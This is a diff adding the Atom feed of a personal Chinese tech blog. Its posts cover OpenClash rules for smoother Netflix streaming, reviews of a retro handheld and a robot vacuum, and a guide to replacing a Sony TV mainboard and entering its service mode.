@@ -1,0 +1,530 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://brick713.github.io</id>
+    <title>Brickの小黑屋</title>
+    <updated>2025-06-04T01:49:29.132Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://brick713.github.io"/>
+    <link rel="self" href="https://brick713.github.io/atom.xml"/>
+    <subtitle>Home is Where Your Wifi Connects Automatically</subtitle>
+    <logo>https://brick713.github.io/images/avatar.png</logo>
+    <icon>https://brick713.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2025, Brickの小黑屋</rights>
+    <entry>
+        <title type="html"><![CDATA[Android TV Netflix 加载卡顿问题]]></title>
+        <id>https://brick713.github.io/GMe_DXnbBk/</id>
+        <link href="https://brick713.github.io/GMe_DXnbBk/">
+        </link>
+        <updated>2025-05-31T09:00:01.000Z</updated>
+        <summary type="html"><![CDATA[<p>家里孩子在电视上看 Netflix 儿童节目的时候，经常出现加载进度卡在25%，需等待较长时间才能正常播放。分析之后，发现问题根源在于电视端的 Netflix 会用内置的 DNS 解析找到离你最近区域的节点，但如果你的<strong>代理规则中的IP覆盖不全，地域节点匹配不准</strong>的话，就会导致流量无法高效分流到代理节点，引发加载缓慢。</p>
+<p>后来在网上找到了 Netflix 官方的 GitHub 项目，提供了他们的IP地理数据（nflx-geofeed），根据这个项目结合自己的代理节点，可以定制精准分流规则，解决加载卡顿问题。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>家里孩子在电视上看 Netflix 儿童节目的时候，经常出现加载进度卡在25%，需等待较长时间才能正常播放。分析之后，发现问题根源在于电视端的 Netflix 会用内置的 DNS 解析找到离你最近区域的节点，但如果你的<strong>代理规则中的IP覆盖不全，地域节点匹配不准</strong>的话，就会导致流量无法高效分流到代理节点，引发加载缓慢。</p>
+<p>后来在网上找到了 Netflix 官方的 GitHub 项目，提供了他们的IP地理数据（nflx-geofeed），根据这个项目结合自己的代理节点，可以定制精准分流规则，解决加载卡顿问题。</p>
+<!-- more -->
+<hr>
+<h4 id="一-第三方规则为何导致netflix卡顿">一、第三方规则为何导致Netflix卡顿？</h4>
+<ol>
+<li>
+<p><strong>规则更新滞后</strong><br>
+第三方规则集（如Dler cloud、ACL4SSR、lhie1等）通常采用通用域名匹配模式，规则一般不会变化，导致 Netflix 部分 IP 未走代理通道。</p>
+</li>
+<li>
+<p><strong>地域匹配不准</strong><br>
+默认规则不会根据你的代理 IP 匹配划分，如果你的分流使用的是香港节点，但规则没匹配香港的IP就会导致速度变慢，触发区域检测机制而引发缓冲。</p>
+</li>
+</ol>
+<hr>
+<h4 id="二-解决方案基于nflx-geofeed的精准规则定制">二、解决方案：基于nflx-geofeed的精准规则定制</h4>
+<p>Netflix官方维护的<a href="https://github.com/Netflix/nflx-geofeed"><strong>nflx-geofeed</strong></a>项目提供了全球各地区服务器IP的地理标签数据。我们可以根据自己的实际代理情况制定精细化规则。</p>
+<h5 id="步骤1提取目标区域数据"><strong>步骤1：提取目标区域数据</strong></h5>
+<p>以香港节点为例：</p>
+<ol>
+<li>访问nflx-geofeed仓库，下载<code>nflx-geofeed.csv</code>文件。</li>
+<li>使用文本工具筛选包含<code>HK</code>（香港）标签的IP段。例如：<pre><code class="language-csv">103.116.204.0/22,HK,,Netflix
+</code></pre>
+</li>
+</ol>
+<h5 id="步骤2构建openclash规则文件"><strong>步骤2：构建OpenClash规则文件</strong></h5>
+<ol>
+<li><strong>IP段规则</strong><br>
+根据Clash语法使用IP-CIDR创建规则。例如：<pre><code class="language-yaml">- IP-CIDR,103.116.204.0/22,Netflix-HK,no-resolve
+</code></pre>
+</li>
+</ol>
+<h5 id="步骤3在openclash中导入规则"><strong>步骤3：在OpenClash中导入规则</strong></h5>
+<ol>
+<li><strong>覆写规则优先执行</strong><br>
+进入OpenClash的<code>覆写设置 → 规则设置</code>，启用自定义规则并粘贴规则内容。覆写规则的优先级高于订阅规则，确保精准匹配。或者在<code>配置管理 → 编辑规则</code>中直接将规则添加到你正在使用的配置文件中。</li>
+</ol>
+<hr>
+<h4 id="四-效果验证与对比">四、效果验证与对比</h4>
+<p>把 IP 规则添加之后，如果你的分流代理速度给力，基本上就能做到秒加载了，你也可以直接用我做好的规则，<a href="https://gist.github.com/brick713/36afee91e8f36360c00213fe6e365e7d"><strong>NetflixRule</strong></a>，规则里包含了域名以及香港、新加坡、台湾、日本的 IP 集，有需要的可以拉取配置文件自己去维护，规则不仅适用于Android TV，也适用于其他设备。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Retroid Pocket3+ 开源掌机]]></title>
+        <id>https://brick713.github.io/TwUjpmp7L/</id>
+        <link href="https://brick713.github.io/TwUjpmp7L/">
+        </link>
+        <updated>2024-08-09T08:31:23.000Z</updated>
+        <summary type="html"><![CDATA[<ul>
+<li>购买渠道：闲鱼</li>
+<li>入手价格：580<br>
+‎<br>
+自从苹果调整了 App Store 对经典游戏模拟器的限制之后，‎一些火热的模拟器得以重新上架 App Store，但是个人在体验过了之后发现虚拟按键的形式玩一些老游戏体验实在有点差，于是打算淘一个开源掌机，在做了一些功课之后选在了机遇 Android 系统的 Retroid Pocket3+，体验下来基本符合自己的期望。</li>
+</ul>
+]]></summary>
+        <content type="html"><![CDATA[<ul>
+<li>购买渠道：闲鱼</li>
+<li>入手价格：580<br>
+‎<br>
+自从苹果调整了 App Store 对经典游戏模拟器的限制之后，‎一些火热的模拟器得以重新上架 App Store，但是个人在体验过了之后发现虚拟按键的形式玩一些老游戏体验实在有点差，于是打算淘一个开源掌机，在做了一些功课之后选在了机遇 Android 系统的 Retroid Pocket3+，体验下来基本符合自己的期望。</li>
+</ul>
+<!-- more -->
+<p>虽然东西购买自闲鱼，但是上一代主人还是非常爱惜设备的，整个成色非常好，没有什么包浆，而且前一任主人还自费升级了一些配件，替换了导电胶的十字键，加上霍尔摇杆，让机器按键质感有了保障，日常玩一些格斗类游戏，手指也更加舒适，不容易疲劳。</p>
+<figure data-type="image" tabindex="1"><img src="https://brick713.github.io/post-images/1723192526759.jpg" alt="设备实机" loading="lazy"></figure>
+<p>Retroid Pocket3+ 的外壳材质是塑料的，但不是那种廉价塑料，因此手感很不错，有一点亲肤材质的感觉。体型上比较像小一号的 Switch，重量 235 克，比较适中，双手握持舒适，长时间游戏也不会感觉坠手。显示屏采用的是 iPhone 同规格的 4.7 英寸 LCD 屏幕，对于长期使用 iPhone 的笔者来说，显示效果上挑不出什么毛病，没有不适感。</p>
+<figure data-type="image" tabindex="2"><img src="https://brick713.github.io/post-images/1723192536971.jpg" alt="对比Switch体积" loading="lazy"></figure>
+<p>Retroid Pocket3+ 支持 TF 卡扩容，有先进的 3.5 毫米耳机孔，底部双扬声器，而且采用的是 USB Type-C 接口，可以说在接口上是非常现代了，不过虽然是双扬声器，但实际的音效很一般，而且扬声器在底部，容易被握持遮挡，效果就又要打折扣。Retroid Pocket3+ 顶部还有MicroHDMI接口，可以输出 720P 画质到显示器上，获得更好的游戏体验。</p>
+<p>开源掌机最重要的还是游戏体验，Retroid Pocket3+，操作系统是基于 Android 11 定制的，做了横版操作的优化，可以通过按键和触碰进行操作，几乎没有学习成本，很容易上手。Retroid Pocket3+ 也做了一个自己的掌机桌面（前端），进入之后会展示所有的模拟器，界面也非常的美观，只要安装了对应的模拟器，导入游戏后，就可以开始进行同年的回忆了。</p>
+<figure data-type="image" tabindex="3"><img src="https://brick713.github.io/post-images/1723192595096.png" alt="Retroid Pocket3+ 默认掌机桌面" loading="lazy"></figure>
+<p>除了 Retroid Pocket3+ 自带的掌机桌面，还有第三方的游戏前端桌面，在开源掌机圈比较有名的有大水杯、天马、ES-DE等等，这些游戏桌面也有很多大神做好了游戏整合包和详细的教程，只要按照教程操作就可以轻松配置好模拟器，并且获得海量的游戏，需要的同学可以自行去 B 站找到相关的教程视频。开源掌机的乐趣之一也在于此，不停的折腾界面和内容，就像中年男人折腾 NAS 一样。</p>
+<figure data-type="image" tabindex="4"><img src="https://brick713.github.io/post-images/1723192608535.gif" alt="适配后的模拟器前端" loading="lazy"></figure>
+<p>本人拿到掌机这段时间已经重温了不少儿时的经典游戏，像重装机兵、炎龙骑士团、仙剑奇侠传、超级机器人大战，对我来说这台开源掌机我个人是十分满意，而且现在的开源掌机圈也是非常的热闹，有非常多的新机器源源不断，期待新人的加入，不过还是要理性购物避免被割韭菜，毕竟开源掌机的硬件性能都很一般，售价相对虚高，还是要根据自己的需求理性消费。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[米家全能扫拖机器人1s]]></title>
+        <id>https://brick713.github.io/YHx_URn92/</id>
+        <link href="https://brick713.github.io/YHx_URn92/">
+        </link>
+        <updated>2023-03-17T03:50:24.000Z</updated>
+        <summary type="html"><![CDATA[<ul>
+<li>购买渠道：淘宝</li>
+<li>入手价格：2999</li>
+</ul>
+<p>自从家里有孩子之后，打扫家里卫生的时间和精力就越来越少，加上家中的「领导」对环境卫生有苛刻的要求，之前的米家扫拖机器人1c已经不能满足她的要求了，因此购买一台扫拖一体机器人保持家庭卫生就提上了议程。经过多方对比之后最终选择了米家全能扫拖机器人1S，在使用了近1个月之后，可以聊聊它究竟如何了。</p>
+]]></summary>
+        <content type="html"><![CDATA[<ul>
+<li>购买渠道：淘宝</li>
+<li>入手价格：2999</li>
+</ul>
+<p>自从家里有孩子之后，打扫家里卫生的时间和精力就越来越少，加上家中的「领导」对环境卫生有苛刻的要求，之前的米家扫拖机器人1c已经不能满足她的要求了，因此购买一台扫拖一体机器人保持家庭卫生就提上了议程。经过多方对比之后最终选择了米家全能扫拖机器人1S，在使用了近1个月之后，可以聊聊它究竟如何了。</p>
+<!-- more -->
+<p>米家全能扫拖机器人1S的配件很简单，除了常规的刷头、拖布头之外，还赠送了一瓶清洁剂，根据操作说明进行安装并连接上米家App后，就可以使用了。如果你像我一样已经是米家的长期用户了，那么整个过程几乎没有任何难度，这也是米家一贯的作风了，简单易用。</p>
+<figure data-type="image" tabindex="1"><img src="https://brick713.github.io/post-images/1679025203853.jpg" alt="朴实无华的配件" loading="lazy"></figure>
+<p>经过这一段时间的使用，我觉得它的优缺点都很明显，先从优点开始说起。</p>
+<p>首先要说的就是清洁能力，4000Pa的吸力加上旋转式的拖头，在扫拖清洁性上得到了家里「领导」的认可，除了一些清扫死角和极其顽固的污渍之外，可以将我家里90%的区域打扫干净，而且拖地后遗留的水痕也较轻，不会影响瓷砖和地板的观感，因此清洁能力可以给到90分。</p>
+<p>第二优点就是它的避障建图能力，我在它第一次扫拖地时候全程跟踪，除了因为高度问题它无法进入电视柜底部，没有发生过一次「愚蠢碰撞」，精准的避开了家里的宠物🐈‍和乱窜的小孩，可见双线激光探测加AI视觉识别避障还是有非常好的效果。一次完整扫拖后，它就准确的完成了建图，并且针对我家里的区域进行了非常准确的识别，前任米家扫拖机器人1c比需要多次清扫才能完成建图，而且因为依靠的是纯视觉系统，经常会在家里乱撞。</p>
+<p>其次就是它强大的智能化功能，依托米家生态和它精准的建图，我可以完美的利用小爱同学对它进行智能化的控制。例如当我们一家出门玩耍的时候，我会让它开启强力清洁加高水位模式，给家里来一次深度打扫，既可以规避清扫的噪音，又能合理利用时间。依托它的建图，我也可以根据需求让它对单独区域进行清扫，比如小孩子在餐厅吃完饭之后，单独清扫餐厅瓷砖的污渍；洗完澡之后，单独清扫浴室的头发等等。</p>
+<p>最后一个优点就是它的体积和性价比，米家作为价格屠夫，在同等价位同等功能上几乎没有对手，定位相似的石头G10s和追觅s10，在功能上和米家全能扫拖机器人1s互有胜负，但是价格上都贵出不少。另外，因为我需要把它摆放在沙发和阳台墙中间，它「高瘦」的体积可以帮我节约更多的空间，配合它的高度，顶部还能临时作为放置物品的空间，这一点上偏「矮胖」的石头G10s在我的使用场景上就稍逊一筹。</p>
+<figure data-type="image" tabindex="2"><img src="https://brick713.github.io/post-images/1679025402852.jpg" alt="刚好嵌入这个空间里，未来可以和阳台排水连接" loading="lazy"></figure>
+<p>同样米家全能扫拖机器人1s也有几个缺点，不得不提。</p>
+<p>第一个就是它自带的语音操控功能，设计上是为了让你可以通过语音控制它对你站立的区域进行打扫，或者语音控制它的工作状态。但因为我把它摆放在客厅，它经常会和我客厅的小爱音箱冲突，有时候我在呼叫音箱的时候它莫名其妙就出仓开始工作，即使我开启了小爱同学的就近唤醒，但因为位置上它过于靠近小爱音箱，还是会产生误操作，最终不得已我关闭机器人上的语音控制功能。</p>
+<p>第二个就是它标配的是胶毛混合的刷头，这种类型的刷头非常容易缠绕毛发，作为一个拥有长发「领导」和宠物🐈‍的家庭，每次清理刷头体验都不好，因此强烈建议米家在后续的产品上改用纯硅胶的刷头，虽然这会影响一点它的集尘效果，但是也可以明显改善缠绕毛发的情况，相较之下我还是愿意选择牺牲集尘效果换来清理刷头的轻松。好在还有补救方案，你可以选择购买追觅s10的硅胶刷头和刷头罩进行更换，一次更换永久收益，不过目前追觅s10的硅胶刷头官方都缺货了，不知道是不是大家都去购买的原因。</p>
+<figure data-type="image" tabindex="3"><img src="https://brick713.github.io/post-images/1679025420251.jpg" alt="" loading="lazy"></figure>
+<p>至于其他方面，比如基站的清扫换水、配件的更换、日常的养护和其他扫拖一体机器人并没有本质上的区别，都处在一个水平线上，没有拉开明显的差距。</p>
+<p>如果你和我一样，需要一台省心省力、性价比高、能自动清洗与烘干、未来可拓展自动上下水，且具备良好的智能家居生活新体验的扫拖机器人，那么米家全能扫拖机器人1S，是个不错的选择。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Sony 电视更换新款海外遥控器]]></title>
+        <id>https://brick713.github.io/Ce3DnY6bq/</id>
+        <link href="https://brick713.github.io/Ce3DnY6bq/">
+        </link>
+        <updated>2022-12-27T07:10:13.000Z</updated>
+        <summary type="html"><![CDATA[<p>众所周知，Sony 国行 J 系列的电视的遥控器是针对中国大陆专门定制的，但是这个定制不仅没有带来良好的用户体验，反而在按键布局、按键反馈、盲操上存在众多不合理的设计，引发大量用户的吐槽，其中就包括罗永浩。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>众所周知，Sony 国行 J 系列的电视的遥控器是针对中国大陆专门定制的，但是这个定制不仅没有带来良好的用户体验，反而在按键布局、按键反馈、盲操上存在众多不合理的设计，引发大量用户的吐槽，其中就包括罗永浩。</p>
+<!-- more -->
+<figure data-type="image" tabindex="1"><img src="https://brick713.github.io/post-images/1672125770700.png" alt="" loading="lazy"></figure>
+<p>幸好索尼今年除了发布 BRAVIA XR 新系列电视外， 还重新设计了遥控器且国行和海外版的区别仅仅是删除了一些海外流媒体按键，因为此前已经将我的国行 A80J 更换了海外主板，详情见<a href="https://moyu.life/y2xp0QCF1/">国行 Sony 电视更换主板最详教程</a>，于是我果断买了海外版的新款遥控器搭配我的电视使用。</p>
+<h3 id="购买渠道">购买渠道</h3>
+<p>我是在<a href="https://www.shopjimmy.com">shopjimmy</a>上购买的 TX-800U，到手大概花了不到 40 刀，送到笔者手上大概花了不到 1 个月时间，现在万能的淘宝上已经有华强北产品了，大概不到 80 RMB，有需求的可以直接华强北买即可，不必再从海外采购，浪费时间和金钱。</p>
+<p>需要注意的是，海外款的遥控器型号有两种，分别是 TX-800U 和 TX-900U，对应 Sony Mini-LED 和 Oled 两个系列的电视，两款遥控器还是有些区别的，TX-900U 材质上是金属拉丝、有背光按键、支持蜂鸣查找且其中一个流媒体按键是 Bravia Core 没有 Youtube 按键。具体购买那款，可以根据自己的需求来选择。</p>
+<figure data-type="image" tabindex="2"><img src="https://brick713.github.io/post-images/1672127823231.jpeg" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://brick713.github.io/post-images/1672127832081.jpeg" alt="" loading="lazy"></figure>
+<h3 id="使用体验">使用体验</h3>
+<p>第一次使用，需要先配对遥控器。首先在电视的设置主页中，找到遥控器配对选项，按照电视机显示步骤配对，长按遥控器上语音和音量键按键，待遥控器指示灯闪烁之后松开手，等到电视显示配对完成即可。配对完成后才能正常使用语音助手按键。</p>
+<p>配对完成后，就可以正常使用遥控器上的所有功能了，因为我的电视已经更换了海外主板，所有流媒体按键都可以正常唤醒对应的软件，语音功能也正常。新的遥控器的按键反馈也远远强于老款，不同按键的大小和分布区域也更方便用户进行操作，在使用了不到半天我已经可以很熟练的盲操了。老款的遥控器已经可以丢到抽屉里吃灰了。</p>
+<h3 id="其他事项">其他事项</h3>
+<p>因为我仅针对 A80J 进行了兼容性测试，如果你使用的是更老一些的 Sony 电视，这里不保证能完全兼容，但是看到<a href="https://www.chiphell.com/thread-2430419-1-1.html">Chiphell</a>上提到，16年之后的电视都可以使用，有需求的可以购买国内款（TX-800X/900X）尝试一下。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[国行 Sony 电视更换主板最详教程]]></title>
+        <id>https://brick713.github.io/y2xp0QCF1/</id>
+        <link href="https://brick713.github.io/y2xp0QCF1/">
+        </link>
+        <updated>2022-05-31T08:50:30.000Z</updated>
+        <summary type="html"><![CDATA[<p>去年双十一的时候家里添置了一台 Sony 电视，完成了一个索粉的信仰充值。在购买之前就了解到国行的 Sony 电视的系统是基于国内用户的特别定制版，在服务和 UI 上都和海外的电视有很大的不同，并且是硬件层面的定制，是无法通过刷固件切换区域这种方式来获得完整的体验。作为一个强迫症加完美主义者，在了解到可以通过更换主板的方式获得完整的服务时，于是就有了这篇文章，有了这次折腾。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>去年双十一的时候家里添置了一台 Sony 电视，完成了一个索粉的信仰充值。在购买之前就了解到国行的 Sony 电视的系统是基于国内用户的特别定制版，在服务和 UI 上都和海外的电视有很大的不同，并且是硬件层面的定制，是无法通过刷固件切换区域这种方式来获得完整的体验。作为一个强迫症加完美主义者，在了解到可以通过更换主板的方式获得完整的服务时，于是就有了这篇文章，有了这次折腾。</p>
+<!-- more -->
+<h1 id="前因">前因</h1>
+<p>之所以会有这次更换主板的想法，主要原因如下：</p>
+<ol>
+<li>电视盒子如果没有完整的「杜比全家桶」就浪费了电视的效果，且盒子和电视部分场景下的切换使用，偶尔让人觉得抓狂；</li>
+<li>国行的电视系统没有完整的生态。虽然也有诸如当贝市场、沙发管家、Emoton store 这些第三方市场可供使用，但是生态是割裂的，应用内容也远远不够</li>
+<li>UI 界面无法接受。充斥各种广告，无效信息和强制安装应用的瀑布式界面，对于我这样的信息洁癖来说，实在无法忍受</li>
+<li>重要服务的缺失。Chromecast、Homekit、Airplay、GMS服务的缺失，让电视的功能大打折扣，虽然可以用其他方案替代，效果始终不理想</li>
+<li>系统、功能、安全补丁更新缓慢。因为定制的原因，导致一些与Google TV同步的系统更新缓慢，总是要缺失很多本来属于用户的功能更新</li>
+</ol>
+<p>基于这些原因，我开始了更换主板之旅，可能有人会问，为什么不买一个电视盒子，比如 Apple TV？因为电视本身的 Google TV 系统就可以带来媲美甚至超越电视盒子的体验了。</p>
+<h1 id="更换流程">更换流程</h1>
+<hr>
+<h2 id="购买主板">购买主板</h2>
+<p>首先我们需要购买海外的电视主板，大家可以在下面几家美国的电子零件供应商购买主板：</p>
+<ul>
+<li><a href="https://www.tvpartstoday.com">tvpartstoday</a></li>
+<li><a href="https://www.tvpartsguy.com">tvpartsguy</a></li>
+<li><a href="https://www.shopjimmy.com">shopjimmy</a></li>
+</ul>
+<p>我最后选择了 <strong>tvpartstoday</strong> 购买主板，这是一家来印第安纳州的电子零件供应商，除了主板之外还包括屏幕、驱动、背板、电源等等。你可以直接搜索你的电视型号，然后购买对应的主板，比如我的电视是型号是 <strong>XR-77A80J</strong>，直接搜索对应型号即可。</p>
+<figure data-type="image" tabindex="1"><img src="https://s2.loli.net/2022/05/31/MJtdwrDgUkS7qvR.png" alt="" loading="lazy"></figure>
+<p><strong>tvpartstoday</strong> 的购买流程并不复杂，注册账号并补充相关信息就好，稍微有一点海淘经验即可完成，我们可以使用 PayPal 或者信用卡进行结算，购买完成后就可以耐心的等待商家将主板寄给你。</p>
+<figure data-type="image" tabindex="2"><img src="https://s2.loli.net/2022/05/31/jXIsOiVZz6KAa9r.png" alt="" loading="lazy"></figure>
+<h2 id="准备工具">准备工具</h2>
+<p>主板到货之后，<strong>tvpartstoday</strong> 还会附赠一个简易的说明书，根据他的提醒我们最好提前准备一个 U 盘，并提前在 Sony 的官网中下载固件，在更换完主板后进行手动更新。</p>
+<figure data-type="image" tabindex="3"><img src="https://s2.loli.net/2022/05/31/G1NuvUbYaWPXj4i.jpg" alt="" loading="lazy"></figure>
+<p>我在更换主板的时候，成功一次点亮，并没有手动升级固件，而是配置完电视之后在线更新了系统，但是为了以防万一，这里还是推荐大家预先下载好自己电视对应的<a href="https://www.sony.com/electronics/support?cpint=d2c-supportmenu">海外固件</a></p>
+<figure data-type="image" tabindex="4"><img src="https://s2.loli.net/2022/05/31/ZGXK1pqcm9jxR5y.png" alt="" loading="lazy"></figure>
+<p>除此之外，因为海外的主板相比国行主板多两个音频口，具体的位置可能根据不同的型号略有不同，因此我们还需要准备一个电钻进行打孔，孔径大概是7MM的大小，当然为了保证拆卸的顺利我们也可以提前准备好金属卡尺或者拆机片拆卸电视后盖。</p>
+<p>当然如果你的动手能力较差或者和我一样电视尺寸过大，无法一个人完成拆卸的话，那么我建议你和我一样选择直接与本地的 Sony 售后人员联系，让 Sony 的工程师上门帮你进行更换，这样能最大程度的减少悲剧的发生，并且你的设备能得到最大程度的保护，当然 Sony 是需要收取一定的人工费用的，这里你可以对照<a href="https://service.sony.com.cn/content/casch/serviceinfo/partsprice.html">服务费用</a>)综合考虑是否需要这样的服务。</p>
+<figure data-type="image" tabindex="5"><img src="https://s2.loli.net/2022/05/31/SxMoeJpVBGdN1Lf.png" alt="" loading="lazy"></figure>
+<p>总结下来我们需要提前准备好：</p>
+<ol>
+<li>
+<p>足够容量的 U盘</p>
+</li>
+<li>
+<p>对应型号的海外固件</p>
+</li>
+<li>
+<p>7MM 钻头的电钻</p>
+</li>
+<li>
+<p>拆机片</p>
+</li>
+<li>
+<p>与本地 Sony 售后工程师沟通</p>
+</li>
+</ol>
+<h2 id="注意事项">注意事项</h2>
+<p>这里再补充一些更换过程中需要注意的事项以及事后我获得的一些信息提前告知一下大家，方便小伙伴们做最后的决策，是否有一些自己不能接受的事情。</p>
+<h3 id="保修和售后">保修和售后</h3>
+<p>作者坐标武汉，有非常方便的 Sony 售后，并且上门的工程师也非常的专业靠谱，如果你所在的区域没有比较健全的服务，那么大概率需要自己动手更换了。我的主板在付费更换完毕后，Sony 的工程师明确表示并不会影响我的电视的一年的整机保修和三年主要部件保修。师傅只是叮嘱我保留原主板，如果出现问题可以联系他们再次进行维修更换，至于不同地区是否有不同的政策，作者不得而知，但是无论如何，更换下来的主板一定要好好保存。</p>
+<h3 id="海外主板的来源">海外主板的来源</h3>
+<p>目前来看，购买的海外主板，有比较大的概率不属于 Sony 工厂原件的而是拆机件，因此 Sony 的工程师是无法将你设备原有的序列号录入到海外主板中的，只有工厂模式主板可以将序列号也就是你机身号码进行录入。上门的 Sony 工程师在进行这个操作的时候发现主板已经有了序列号也有了主板型号，但这并不影响主板本身的使用和功能，大家可以不必担心。</p>
+<h3 id="有线电视功能可能有影响">有线电视功能可能有影响</h3>
+<p>因为是海外主板，因此有线电视的功能会与国内的有线电视传输协议上可能存在一定的偏差，如果你有使用有线电视的需求，那么需要慎重考虑一下换主板是否有必要了。这里作者因为没有亲自测试过是否有影响，但是网络上有反馈可能会出现无法使用的情况，因此还是提醒一下大家风险，但要注意的是运营商的 IPTV 电视服务是不受任何影响的！</p>
+<h3 id="部分国行电视功能丧失">部分国行电视功能丧失</h3>
+<p>更换完主板后，有一些专门针对国行电视的功能就会彻底消失了，比如内置的电视应用商城、电视自带优惠活动的兑换、针对国内用户的电视会员优惠、国内流媒体的一些会员优惠。除此之外，遥控器上的流媒体快捷键也会提示找不到 App，因为内置的腾讯视频在海外系统不是内置安装的。</p>
+<h3 id="激活电视的网络需求">激活电视的网络需求</h3>
+<p>更换了主板后，电视的部分功能需要有流畅的网络方可使用，在刚开始激活电视时，因为 NTP 服务器的原因，WIFI 可能存在实际已连上但是不能联网的情况，这里进入系统设置里手动修改时间后即可解决，也可以后续通过进入开发者模式后，使用 ADB 命令修改 NTP 服务器同步地址来解决</p>
+<p>如果上述的一些事项你看过之后和作者一样都能接受，那么你就可以大胆的更换主板了。</p>
+<h2 id="更换激活">更换激活</h2>
+<p>如果你是自己更换，在断电之后，我们首先需要拆卸电视背板，不同的电视型号的背板大同小异。机身和背板主要通过卡扣连接，在卸掉固定背板的螺丝之后，需要使用拆机片或者金属卡尺慢撬开连接的卡口，这一步需要小心一点，避免撬断卡扣。成功打开背板之后，整个机身大概是这样</p>
+<figure data-type="image" tabindex="6"><img src="https://s2.loli.net/2022/05/31/FN2Y9r3CgMwsd4Z.jpg" alt="" loading="lazy"></figure>
+<p>卸掉固定主板的螺丝，并小心拆卸掉上面的排线，取下主板即可，这里别忘了对主板的挡板进行开口，前面提到过，海外的主板有多的音频接口。之后就是重新插上排线，并且固定好主板，大家也可以去B站和油管上搜索一下拆解更换视频，也许能找到对应的电视型号，跟着视频拆解会更有信心一些。</p>
+<p>更换完毕后，别着急立刻装好背板，先通电开机，看看是否能正常点亮，当我们能看到下面的画面的时候，证明一切顺利，可以放心的还原电视了！</p>
+<figure data-type="image" tabindex="7"><img src="https://s2.loli.net/2022/05/31/szjkUCDO7M1I6bf.jpg" alt="" loading="lazy"></figure>
+<p>我们可以选择使用 Google TV 或者 Base TV 模式，这里后续的设置可以根据你的实际使用情况来选择，相信能完成前面所有工作的小伙伴，后续设置上应该不会有太多困难了，唯一要提的是初次使用和激活 HomeKit 和 AirPlay2 功能时，全过程需要联网激活，你需要一个可用的海外代理，否则会一直提示 HomeKit 连接密码错误。</p>
+<figure data-type="image" tabindex="8"><img src="https://s2.loli.net/2022/05/31/ZLlheR7jx9iX8qf.jpg" alt="" loading="lazy"></figure>
+<p>当你正常接入 Homekit 之后，你就可以通过 Siri 控制电视的开关，包括使用 iPhone 虚拟遥控器控制电视了。</p>
+<figure data-type="image" tabindex="9"><img src="https://inews.gtimg.com/newsapp_bt/0/10966383371/1000" alt="" loading="lazy"></figure>
+<p>最后一步，我们还需要把校色数据导入到主板中，我们要在工厂模式（ service mode ）下，选择显示面板设定（ Panel/PQ ）——色彩参数传输（ WB/Mura/CUC data transfer ）——勾选三个参数——选择 T-con-&gt;SoC 然后执行（ Start ）。这里执行完之后，不会有界面上的反馈，我们需要直接断电让配置生效。这里是 Sony 的工程师告知我的，具体原因不详，既然工程师这么说了，照做即可。SONY 电视出厂是校色过的，色彩文件一式两份主板驱动版上各一份，可以导入导出至对方，只要不是驱动板和主板一起损坏，文件不会丢，所以至少要保证一个板子没换过才能保留色彩文件。</p>
+<p>至于如何进入工厂模式（ service mode ），有两种方式：</p>
+<ol>
+<li>
+<p>首先激活电视的开发者模式，激活方式和所有 Android 设备，在设备信息中连续点击版本号即可，之后进入开发者模式选项，开启 ADB 调试，然后就可以在同一个局域网中使用其他设备连接你的电视了。输入 ADB 命令 am start -a com.sony.dtv.intent.action.SELF_DIAG_MODE 即可进入工厂模式。</p>
+</li>
+<li>
+<p>通过遥控器进入，自带的原厂遥控器是不可以的，我们需要购买工程遥控器，型号为 TX210C，可以在淘宝上自行购买。使用工程遥控器，在电视关机的情况下，依次按下⌈5⌋【音量减】【开机】，即可进入工厂模式。</p>
+</li>
+</ol>
+<figure data-type="image" tabindex="10"><img src="https://s2.loli.net/2022/05/31/ZKWkTqMJHbG6zVr.jpg" alt="" loading="lazy"></figure>
+<p>到此，我们所有工作就做完了，下面就可以真正的完整的享受 Sony 电视的全部功能了！</p>
+<h2 id="系统体验">系统体验</h2>
+<p>更换主板完成好配置之后，我们就可以体验 Google TV 了，界面上再也没有国内冗杂烦人的广告，界面的操作逻辑也更合理。</p>
+<figure data-type="image" tabindex="11"><img src="https://s2.loli.net/2022/05/31/BZHK2cEzhsvCJjV.jpg" alt="" loading="lazy"></figure>
+<p>如果你的 IP 地址和你的 Google 账号区域相对应，电视也会给你推荐相应的内容，我们也可以自己管理在主界面上需要展示的流媒体推荐内容，主流的 Disney +、Apple TV、Prime Video、Hulu 都是支持的，但是缺失了 Netflix，希望 Google 能赶紧补全。</p>
+<figure data-type="image" tabindex="12"><img src="https://s2.loli.net/2022/05/31/Bc5Ge7VPSNFEUdr.jpg" alt="" loading="lazy"></figure>
+<p>当然最重要的收益就是，我们可以获得完整的 Google 生态，我们可以同步我们的 Google 生态下所有的服务，比如我是 YouTube Premium 的会员，我可以在电视上享受完整的服务内容，不再需要使用第三方的 YouTube 应用，我可以方便的通过 Web 端端 Google Play Store 下载和管理我的电视应用。</p>
+<figure data-type="image" tabindex="13"><img src="https://s2.loli.net/2022/05/31/K1BkJHdhi7eWvxT.png" alt="" loading="lazy"></figure>
+<p>我们也可以方便的同步我账号的密码，不再需要用遥控器傻傻的进行输入。</p>
+<figure data-type="image" tabindex="14"><img src="https://s2.loli.net/2022/05/31/FGZYD45zJpbcgns.jpg" alt="" loading="lazy"></figure>
+<p>同样也可以用上更加智能，且与生态结合的更紧密的 Google Assistant，你可以用它结合 Google 强大的搜索能力，得到几乎最精准的内容，而且支持中文！</p>
+<figure data-type="image" tabindex="15"><img src="https://s2.loli.net/2022/05/31/XAJFx3ZwPNi8Sfg.jpg" alt="" loading="lazy"></figure>
